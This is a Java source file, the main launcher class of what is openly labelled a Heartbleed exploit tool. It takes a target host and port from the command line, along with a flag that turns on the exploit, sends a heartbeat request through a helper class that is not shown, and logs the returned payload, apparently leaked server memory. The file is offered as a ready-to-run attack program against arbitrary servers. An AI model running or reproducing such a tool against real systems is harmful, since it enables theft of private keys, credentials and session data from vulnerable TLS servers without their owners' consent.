package com.vegaasen.exploit.heartbleed.run;

import com.vegaasen.exploit.heartbleed.model.Container;
import com.vegaasen.exploit.heartbleed.properties.SslConstants;
import com.vegaasen.exploit.heartbleed.util.HeartBeatUtil;

import java.util.logging.Logger;

/**
 * @author <a href="vegaasen@gmail.com">vegardaasen</a>
 */
public final class InitiateBleed {

    private static final Logger LOG = Logger.getLogger(InitiateBleed.class.getSimpleName());

    @SuppressWarnings("all")
    public static void main(final String... args) {
        if (args == null || args.length == 0) {
            printUsageAndDie();
        }
        final String hostName = args[0];
        int port = SslConstants.DEFAULT_SSL_PORT;
        boolean withExploit = false;
        if (args.length > 1) {
            port = Integer.parseInt(args[1]);
        }
        if (args.length > 2) {
            withExploit = Boolean.parseBoolean(args[2]);
        }
        final Container container = HeartBeatUtil.sendRequest(
                hostName,
                port,
                withExploit);
        if (container != null) {
            LOG.info(String.format("%s", container.getPayloadAsRadixString()));
        }
    }

    private static void printUsageAndDie() {
        System.out.print(
                "InitiateBleed \"<host>\" (opt) <port> (opt) withExploit (true|false)"
        );
        System.exit(-1);
    }

}
